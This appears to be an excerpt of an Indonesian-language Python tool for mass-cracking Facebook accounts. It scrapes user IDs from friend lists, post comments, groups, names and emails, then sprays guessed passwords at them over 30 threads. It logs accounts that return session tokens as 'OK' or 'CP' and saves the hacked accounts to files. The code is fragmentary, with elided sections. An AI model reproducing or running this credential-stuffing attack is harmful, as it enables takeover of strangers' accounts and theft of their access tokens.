...
██║░╚███║██║░░██║██║░╚███║╚██████╔╝╚██████╔╝
╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░░╚═════╝░
                         Thaks  {M2} 𝐴𝑙𝑒𝑥 𝑔𝑎𝑛𝑠,𝑅𝑜𝑏𝑒𝑡 𝑋𝐷, 𝐿𝑢𝑐𝑖𝑣𝑒𝑟 𝑋𝐷, 𝑴𝑶𝑪𝑯 𝑵𝑨𝑵𝑮𝑮 𝑿𝑫
                       𝕄𝕒𝕕𝕖 𝔹𝕪 {M2} 🇲​​​​​🇴​​​​​🇨​​​​​🇭​​​​​ 🇳​​​​​🇦​​​​​🇳​​​​​🇬​​​​​🇬​​​​​ 🇽​​​​​🇩​​​​​ {M2}ℂ𝕠𝕕𝕖𝕣""",width=80,style=f"{color_panel}"))
...
class Menu:
	...
	def menu(self):
		...
		###----------[ PANEL BIASA ]---------- ###
		prints(Panel(f"{M2}{self.ip}",padding=(0,30),title=f"{M2}{nama}",subtitle=f"{B2}{self.negara}",style=f"{color_panel}"))
		prints(Panel(f"""{M2}[{color_text}01{M2}]. ᴄʀᴀᴄᴋ ɪᴅ ꜰᴇᴄᴇʙᴏᴏᴋ   [{color_text}05{M2}].𝘾𝙧𝙖𝙘𝙠 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 𝙁𝙖𝙘𝙚𝙗𝙤𝙤𝙠
[{color_text}02{M2}].𝐂𝐫𝐚𝐜𝐤 𝐏𝐞𝐧𝐠𝐢𝐤𝐮𝐭 𝐟𝐛    [{color_text}06{M2}].𝐂𝐫𝐚𝐜𝐤 𝐧𝐚𝐦𝐚 𝐟𝐛
[{color_text}03{M2}].𝐂𝐫𝐚𝐜𝐤 𝐤𝐨𝐦𝐞𝐧𝐭𝐚𝐫 𝐟𝐛    [{color_text}07{M2}].𝐂𝐫𝐚𝐜𝐤 𝐠𝐫𝐮𝐩 𝐟𝐛
[{color_text}04{M2}].𝐂𝐫𝐚𝐜𝐤 𝐞𝐦𝐚𝐢𝐥 𝐟𝐛       [{color_text}08{M2}].𝐂𝐫𝐚𝐜𝐤 𝐨𝐩𝐬𝐢 𝐜𝐩 𝐟𝐛""",width=80,padding=(0,6),style=f"{color_panel}"))
		prints(Panel(f"""{M2}ketik {H2}bot{M2} untuk ke menu bot dan ketik {H2}lain{M2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
		menu = console.input(f" {H2}• {M2}pilih menu : ")
		
		###----------[ ID PUBLIK ]---------- ###
		if menu in["1","01"]:
			prints(Panel(f"""{M2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{B2}ketik {H2}me{M2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
		...
		###----------[ KOMENTAR ]---------- ###
			...
			prints(Panel(f"""{M2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {M2}masukan id postingan : ")
			Dump(cookie).Dump_Komentar(f"https://free.facebook.com/{user}")
			Crack().atursandi()
			
		###----------[ EMAIL ]---------- ###
		elif menu in["4","04"]:
			prints(Panel(f"""{M2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
		...
		###----------[ USERNAME ]---------- ###
			...
			user = console.input(f" {H2}• {M2}masukan nama : ")
			limit = console.input(f" {H2}• {M2}masukan limit : ")
		...
		try:
			...
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					...
					console.print(f" {H2}• {M2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in url.find_all("a",href=True):
				if "Lihat Teman Lain" in x.text:
					self.Dump_Publik("https://free.prod.facebook.com/"+x.get("href"))
		except:pass
...
class Crack:
	...
	def atursandi(self):
		...
		set = console.input(f" {H2}• {M2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
		
		###----------[ SANDI MANUAL ]---------- ###
		if set in["Y","y"]:
			prints(Panel(f"""{M2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
			...
			if len(pwx)<=5:
				...
				exit()
			prints(Panel(f"""{M2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
			app = console.input(f" {H2}• {M2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
			if app in["Y","y"]:
	...
	def manual(self,pw):
		...
		prints(Panel(f"""{M2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {M2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
			...
			with ThreadPoolExecutor(max_workers=30) as fall:
				...
				for data in tampung:
					try:
						...
						fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{M2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{B2} CP : {M2}{len(self.cp)}{B2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
							
	###----------[ METODE API ]---------- ###
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}•{M2} HackFB {H2}Alex Gans{M2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{B2} CP : {M2}{len(self.cp)}{B2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				...
				if "session_key" in post.text and "EAA" in post.text:
					...
					if user in self.ok or user in self.cp:
						...
						self.cp.append(user)
						tree = Tree(Panel.fit(f"""{M2}{ Cp}|{password}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
...
[{color_text}02{P2}]. lihat akun hasil crack cp""",width=80,padding=(0,20),style=f"{color_panel}"))
		...
		for fil in dirs:
			...
			self.listfile.append(Panel(f"{M2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{M2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{M2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
		console.print(Columns(self.listfile))
		prints(Panel(f"""{M2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_panel}"))
		result = console.input(f" {H2}• {M2}masukan angka : ")
...
[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",width=80,padding=(0,7),style=f"{color_panel}"))
		...
		elif ask in["03","3"]:warna = "[#M2]";teks="kuning"
